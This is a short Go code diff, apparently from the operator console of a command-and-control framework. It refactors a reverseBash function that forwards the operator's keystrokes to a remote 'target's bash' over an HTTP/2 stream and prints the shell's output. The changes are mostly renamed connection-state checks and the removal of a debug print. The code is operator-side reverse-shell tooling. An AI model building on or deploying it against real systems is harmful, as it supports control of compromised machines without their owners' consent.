@@ -53,7 +53,7 @@ func reverseBash() {
 			CliPrintWarning("Closing /dev/tty: %v", err)
 		}
 
-		err = agent.H2Stream.Close()
+		err = agent.H2Stream.Conn.Close()
 		if err != nil {
 			CliPrintWarning("Closing reverse shell connection: ", err)
 		}
@@ -64,7 +64,7 @@ func reverseBash() {
 	// receive and display bash's output
 	go func() {
 		for incoming := range RecvAgent {
-			if agent.H2StreamDone {
+			if agent.H2Stream.IsClosed {
 				break
 			}
 			os.Stdout.Write(incoming)
@@ -75,15 +75,15 @@ func reverseBash() {
 	// send whatever input to target's bash
 	go func() {
 		for outgoing := range SendAgent {
-			if agent.H2StreamDone {
+			if agent.H2Stream.IsClosed {
 				break
 			}
 
 			// if connection does not exist yet
-			if agent.H2Stream == nil {
+			if agent.H2Stream.Conn == nil {
 				continue
 			}
-			_, err = agent.H2Stream.Write(outgoing)
+			_, err = agent.H2Stream.Conn.Write(outgoing)
 			if err != nil {
 				CliPrintWarning("Send to remote: %v", err)
 				break
@@ -100,7 +100,7 @@ func reverseBash() {
 	signal.Notify(ch, syscall.SIGWINCH)
 	go func() {
 		for range ch {
-			if agent.H2StreamDone {
+			if agent.H2Stream.IsClosed {
 				break
 			}
 
@@ -141,7 +141,7 @@ func reverseBash() {
 	// read user input from /dev/tty
 	for {
 		// if connection is lost, press any key to exit
-		if agent.H2StreamDone {
+		if agent.H2Stream.IsClosed {
 			CliPrintWarning("Remote bash disconnected, aborting...")
 			return
 		}
@@ -153,7 +153,6 @@ func reverseBash() {
 			CliPrintWarning("Bash read input: %v", err)
 			break
 		}
-		color.Red("%v", buf)
 		if buf[0] == 4 { // Ctrl-D is 4
 			color.Red("EOF")
 			break
